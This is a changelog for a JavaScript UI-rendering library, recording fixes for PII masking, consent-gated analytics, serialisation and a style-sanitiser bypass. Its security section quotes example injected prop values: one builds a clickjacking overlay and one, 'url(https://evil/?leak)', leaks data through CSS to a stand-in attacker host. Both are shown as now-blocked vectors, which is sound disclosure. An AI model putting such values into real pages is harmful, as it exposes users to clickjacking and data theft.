# Changelog

All notable changes to `@noidmejs/atomkit`. Pre-1.0: minor versions may break.

## 0.6.0

A multi-lens audit found that three of this package's headline guarantees did not
hold. Each item below was reproduced by executing the shipped `dist/`, and each is
now covered by `test/regressions.test.mjs`.

### Security / privacy — BREAKING
- **PII masking is now genuinely by value.** `maskNode` masked only *string*-typed
  props whose *name* appeared in a fixed list, so numeric PII (`value: 250000`), a
  phone under any other prop name, the `video` atom's `url`, and every prop of a
  custom atom passed through `stripDocument` unmasked. Masking is now
  deny-by-default: every prop is masked or dropped unless it is provably structural
  (`width`, `level`, `cols`, …); locators (`src`, `href`, `url`, `poster`, …) are
  dropped; numbers, booleans and unknown props fail closed.
- **The renderer handed atoms the unmasked node.** `AtomRenderProps.node` was the
  original node, so any atom reading `node.props.*` / `node.a11y.*` read around the
  mask — the built-in `Image` did. Atoms now receive the masked node.
- **`stripDocument` leaked egress-only fields.** `meta.note` (documented "never
  rendered") and credential-bearing data-binding headers (`Authorization`,
  `Cookie`, `x-api-key`, …) were serialised to every client. Both are now stripped.
- **Analytics attributes now fail CLOSED.** They were emitted unless consent was
  explicitly `false`, so a host passing no context (the README quick-start) shipped
  `data-analytics-*` with no consent signal. They now require
  `consent.analytics === true`, matching `consentCategory` gating and
  data-protection-by-default. **Set `consent: { analytics: true }` to restore tracking.**
- **Dimension props bypassed the style sanitiser.** `container width="100px;position:fixed;top:0"`
  injected a clickjacking overlay and `gutter="url(https://evil/?leak)"` exfiltrated
  via CSS — the exact vectors SECURITY.md claims are dropped. `Section`, `Container`,
  `Grid` and `Spacer` now route `width`/`gutter`/`min`/`height` through the new
  exported `safeDim()`, which `atomkit-compiler` imports rather than duplicating.
- **A11y text is masked with `PII_MASK_LABEL` ("Redacted")** instead of `•••••`,
  which a screen reader announces as "bullet bullet bullet" or skips entirely.

### Fixed — BREAKING
- **Responsive overrides never applied.** The base style is an inline `style=`
  attribute and the override a class rule inside `@media`; an inline style outranks
  any class selector at every viewport, so `md:size=4rem` was dead over a base
  `size=12px`. Media declarations are now `!important`, scoped to the node's own
  `.ak-<id>` class. (The old tests asserted the CSS *string* was produced, never
  that it won.)
- **`serialize()` silently dropped governance.** It emitted only props/style/
  aria-label/role/track/protected/pii — so `roles`, `consentCategory`, `hidden`,
  data bindings, `alt`, `tags` and analytics `event`/`category` vanished, and a
  doc→AQL→doc round trip turned an admin-only node into a public one. `serialize()`
  is now the exact inverse of `parse()` (property-tested), emits `desc` on the page
  header, and **throws** on any field AQL cannot express rather than dropping it.
- **`coerce()` destroyed leading/trailing zeros with no escape hatch.**
  `zip="02115"` became `2115` and `ver="1.10"` became `1.1`, because quoting was
  stripped before coercion. A **quoted** value is now always a string; bare values
  still coerce. `serialize()` re-quotes strings that would otherwise re-coerce.
- **`grid cols` is clamped to 24**, matching the compiler (an unclamped `cols=100000`
  emitted a 100k-track template).

### Added
- `safeDim(value, fallback)` — the sanitiser for props that reach an inline style.
- `PII_MASK_LABEL` — the assistive-technology mask.
- `test/regressions.test.mjs` — one assertion per defect above.

## 0.5.1
### Fixed
- **AQL parser**: an unquoted URL value (`href=https://…`) was truncated at `//`
  and the rest of the line swallowed as a comment. `//` now starts a trailing
  comment only at head start or after whitespace, so unquoted `https://` URLs (and
  the attributes after them) parse correctly. Quoted URLs were unaffected.

## 0.5.0
### Security / privacy (from the adversarial audit)
- **PII masking is now by VALUE**: masks the data-binding target prop, content
  props (`summary`/`label`/`value`/`title`/`caption`/`alt`), `a11y` label text and
  analytics prop values, and drops the data binding — not just `text`/`src`/`href`.
- **PII masking cascades to descendants**: flagging a container `pii` protects its
  whole subtree, in both `renderNode` and `stripDocument`.
- Registry lookup uses `Object.hasOwn` — a `node.type` naming an `Object.prototype`
  member (`constructor`, `toString`, …) now fails closed instead of throwing.
- `clean()` also rejects the URL-bearing CSS functions `image-set()` / `cross-fade()`.
### Accessibility
- `List` restores `role="list"` / `role="listitem"` when markers are removed (WCAG 1.3.1).
- New `lint(document)` — WCAG-oriented warnings (missing image `alt`, unnamed controls, heading level).

## 0.4.0
- Security hardening + **governance-at-egress** (`stripDocument`); deterministic
  selector-safe ids; `url()` + style guards; `getPath` prototype-pollution guard;
  parser caps (size / nodes / depth); consent-gated analytics.

## 0.3.0
- Richer atom set (`section`/`container`/`grid`/`row`/`stack`/`link`/`chip`/`list`/`icon`/`accordion`/`video`); char-level AQL parser (inline + multi-line blocks).

## 0.2.0
- **AQL** query language (`parse`/`compilePage`/`serialize`) + AI bridge (`systemPrompt`/`generate`); Node-portable ESM (NodeNext).

## 0.1.0
- Initial release: document model, SSR-safe renderer, starter atoms, `createBuilder`.
